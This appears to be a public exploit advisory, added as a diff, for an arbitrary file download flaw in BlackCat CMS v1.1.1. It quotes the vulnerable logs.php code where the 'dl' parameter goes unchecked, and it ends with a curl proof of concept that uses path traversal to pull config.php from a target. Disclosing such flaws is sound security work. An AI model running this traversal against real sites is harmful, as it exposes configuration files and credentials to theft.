@@ -1,0 +1,45 @@
+# Exploit Title: BlackCat CMS v1.1.1 Arbitrary File Download Vulnerability 
+# Date: 2015/06/16
+# Vendor Homepage: http://blackcat-cms.org/
+# Software Link: http://blackcat-cms.org/temp/packetyzer/blackcatcms_2fo3PXdKj1.zip
+# Version: v1.1.1
+# Tested on: Centos 6.5,PHP 5.4.41
+# Category: webapps
+
+* Description
+
+file:/modules/blackcat/widgets/logs.php
+
+ 72 // download
+ 73 if(CAT_Helper_Validate::sanitizeGet('dl'))
+ 74 {
+ 75     $file = CAT_Helper_Directory::sanitizePath(CAT_PATH.'/temp/'.CAT_Helper_Validate::sanitizeGet('dl'));  <-- Not Taint Checking
+ 76     if(file_exists($file))
+ 77     {
+ 78         $zip = CAT_Helper_Zip::getInstance(pathinfo($file,PATHINFO_DIRNAME).'/'.pathinfo($file,PATHINFO_FILENAME).'.zip');
+ 79         $zip->config('removePath',pathinfo($file,PATHINFO_DIRNAME))
+ 80             ->create(array($file));
+ 81         if(!$zip->errorCode() == 0)
+ 82         {
+ 83             echo CAT_Helper_Validate::getInstance()->lang()->translate("Unable to pack the file")
+ 84                 . ": ".str_ireplace( array( str_replace('\\','/',CAT_PATH),'\\'), array('/abs/path/to','/'), $file );
+ 85         }
+ 86         else
+ 87         {
+ 88             $filename = pathinfo($file,PATHINFO_DIRNAME).'/'.pathinfo($file,PATHINFO_FILENAME).'.zip';
+ 89             header("Pragma: public"); // required
+ 90             header("Expires: 0");
+ 91             header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
+ 92             header("Cache-Control: private",false); // required for certain browsers
+ 93             header("Content-Type: application/zip");
+ 94             header("Content-Disposition: attachment; filename=\"".basename($filename)."\";" );
+ 95             header("Content-Transfer-Encoding: binary");
+ 96             header("Content-Length: ".filesize($filename));
+ 97             readfile("$filename");
+ 98             exit;
+ 99         }
+100     }
+
+
+POC:
+curl -sH 'Accept-encoding: gzip' "http://10.1.1.1/blackcat/modules/blackcat/widgets/logs.php?dl=../config.php" |gunzip - 
